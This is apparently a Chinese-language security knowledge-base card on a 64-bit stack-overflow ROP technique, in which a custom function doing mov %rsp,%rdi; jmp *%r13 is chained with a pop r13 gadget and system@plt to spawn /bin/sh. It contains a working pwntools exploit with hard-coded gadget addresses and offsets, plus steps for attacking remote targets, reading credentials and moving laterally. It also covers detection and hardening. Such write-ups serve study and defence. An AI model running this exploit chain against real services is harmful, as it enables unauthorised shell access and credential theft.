---
id: binary-pwn-rop-mov-rsp-rdi-jmp-r13-system
title: 栈溢出 ROP：借 mov %rsp,%rdi + jmp *%r13 的自定义函数调用 system
type: scenario
domain: binary
path: binary/pwn/rop
technique: rop-mov-rsp-rdi-jmp-r13
tags:
- pwn
- stack-overflow
- rop
- nx
- no-pie
- gadget
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V83
  verified_at: '2026-11-05T17:50:19+08:00'
  notes: 已对照原文与图08/09/10/13核对：IDA 确认选项1为 fgets+printf 与后续 640 字节输入，pattern 120 触发崩溃，gdb info frame saved rip=0x4130634139624138、pattern_offset=56；objdump 的 _xl 为 push %rbp; mov %rsp,%rbp; mov %rsp,%rdi; jmp *%r13，pop r13=0x4011c6、system@plt=0x401050、_xl=0x4011cc，payload 48+8(/bin/sh 占保存RBP槽)+pop_r13+system+_xl 与原文一致。核对时已将卡内丢失 % 前缀的 AT&T 指令补全为 mov %rsp,%rdi / jmp *%r13，消除 Intel 语法歧义；PoC 未复跑；无版本。
url: /docs/binary/pwn/rop/binary-pwn-rop-mov-rsp-rdi-jmp-r13-system/
draft: false
kb_aliases:
- _xl 函数 ROP
- pop r13 gadget
- ret2system ROP
- 无 PIE 栈溢出 ROP
---

## 一句话结论

在 NX 开启、无 Canary、无 PIE 的 64 位栈溢出中，若二进制里存在 `push %rbp; mov %rsp,%rbp; mov %rsp,%rdi; jmp *%r13` 这类“把栈顶交给 RDI 再跳寄存器”的函数，配合一个 `pop r13; ret` gadget 和 `system@plt`，即可用一条极短 ROP 链执行 `/bin/sh`，完全不依赖 libc 基址。

## 原理

- NX 只阻止执行栈上的 shellcode，不阻止复用二进制自身的可执行代码；PIE 关闭时函数与 gadget 地址固定，`system@plt` 可直接写进返回地址链。
- 关键函数 `_xl` 的反汇编为：
  `push %rbp; mov %rsp,%rbp; mov %rsp,%rdi; jmp *%r13`（AT&T 语法，与 objdump 输出一致）。
  `mov %rsp,%rdi` 把当前栈指针写入 RDI，而 x86-64 System V 调用约定中 `system()` 的第一个参数正是 RDI；`jmp *%r13` 相当于以 R13 为目标的无返回跳转。
- 因此只要让 R13 等于 `system` 地址、让 RSP 指向 `/bin/sh` 字符串，再跳进 `_xl`，就等价于调用 `system("/bin/sh")`。
- 难点是“把字符串放到 RSP 指向的位置”。函数序言/返回序列 `leave; ret` 会先用保存的 RBP 值装载 RBP：把 `/bin/sh\x00` 放在栈上“保存的 RBP”槽位，`leave` 就把它读进 RBP；随后跳转到 `pop r13; ret`，R13 被设为 `system`，再返回到 `_xl`。`_xl` 的 `push rbp` 会把含 `/bin/sh` 的 RBP 压栈，RSP 正好指向它，`mov %rsp,%rdi` 于是让 RDI 指向该字符串。
- 偏移计算：输入到保存 RIP 的距离为 56 字节，其中前 48 字节填 junk，最后 8 字节放 `/bin/sh\x00` 占用保存的 RBP 槽，之后依次是 `pop r13`、`system@plt`、`_xl`。

## 触发条件

- 栈溢出且可控保存的 RIP，输入长度足够覆盖到返回地址。
- 二进制未启用 Canary，或 Canary 已被泄露并回填。
- 未启用 PIE（或已泄露代码基址），能硬编码 `system@plt`、gadget 与 `_xl` 的地址。
- 存在一个“写寄存器 + 间接跳转”的 gadget/函数（`jmp *%r13`、`call *%r13`、`mov %rsp,%rdi` 等），以及一个可弹出对应寄存器的 gadget（`pop r13; ret`）。
- 二进制链接了 `system`（PLT 存在），或能找到等价的 `execve`/`system` 入口。

## 利用步骤

1. 用 `checksec` 确认保护：NX 开启、无 Canary、无 PIE、Partial RELRO。
2. 用 `pattern_create`/`pattern_offset` 定位溢出偏移；通过 gdb 附加触发崩溃，`info frame` 读取 saved RIP 对应的 pattern 值，得到偏移 56。
3. 反汇编查找可复用入口：`objdump -d ./bin | grep -E '_xl|system|pop %r13'`，记录 `system@plt`、`pop r13` gadget、`_xl` 地址。
4. 构造 payload：`b"A"*48 + b"/bin/sh\x00" + p64(pop_r13) + p64(system) + p64(_xl)`。
5. 先本地起进程验证能拿到 shell，再把 `process` 换成 `remote` 打目标；远程需先通过前置认证（如 2FA）进入存在溢出的菜单。
6. 获取 shell 后检查 `id`，再读取用户 flag/凭据，继续横向。

## PoC

```python
from pwn import *
context.binary = elf = ELF("./bin")

system_plt = elf.plt["system"]        # 0x401050
pop_r13    = 0x4011c6                 # pop r13; ret
xl_func    = 0x4011cc                 # push rbp; mov rsp,rbp; mov rsp,rdi; jmp *r13

p = process("./bin")
# ... 完成程序前置登录/菜单选择，进入存在溢出的输入点 ...
offset = 56 - 8                       # 48：预留保存的 RBP 槽给 /bin/sh
payload  = b"A" * offset
payload += b"/bin/sh\x00"             # 被 leave 装入 RBP，再由 _xl 压栈成为 RDI
payload += p64(pop_r13) + p64(system_plt) + p64(xl_func)
p.sendline(payload)
p.interactive()
```

```text
偏移来源：pattern_offset -q 0x4130634139624138 -> 56
checksec：NX enabled / No canary / No PIE / Partial RELRO
```

## 变体与关联

- 变体：若 gadget 是 `call *r13` 或 `mov rsp,rdi; call *r13`，链结构相同，只需替换跳转指令地址。
- 变体：没有 `mov rsp,rdi` 时可用 `pop rdi; ret` + 栈上字符串地址的常规 ROP；若二进制无 `pop rdi`，可转向 ret2csu（`__libc_csu_init`）或 SROP。
- 变体：PIE 开启时先用格式化字符串/栈泄漏拿到代码基址；Canary 开启时先泄露并回填 Canary（见关联卡）。
- 关联：[[binary-pwn-stack-ret2libc]]（泄漏 libc 基址后 ret2libc 的通用路线）、[[binary-pwn-format-string-canary-leak-ret2copy-authorized-keys]]（同一文章的格式串泄露 Canary 场景）。
- 边界：若 `_xl` 与 gadget 在目标版本被优化掉、或 `system@plt` 不在导入表，需要换用其他 thunk/库函数；ASLR 对代码段无效的前提是 PIE 关闭。

## 检测与防御

- 检测：崩溃转储中出现固定代码地址、`/bin/sh` 字符串与连续 gadget 地址；监控进程异常派生出 `sh`/`bash`；二进制存在 `jmp *r13`/`mov rsp,rdi` 这类非常规 thunk 时提高审计优先级。
- 修复：启用 PIE、Canary、Full RELRO；用 `-fstack-protector-strong` 与 `-D_FORTIFY_SOURCE=2` 重新编译；移除或改写可被用作通用 thunk 的自定义函数。
- 加固：开启 ASLR 与 CET/CFI；对以高权限运行的服务启用 seccomp 限制 `execve`；对交互式二进制做输入长度校验。
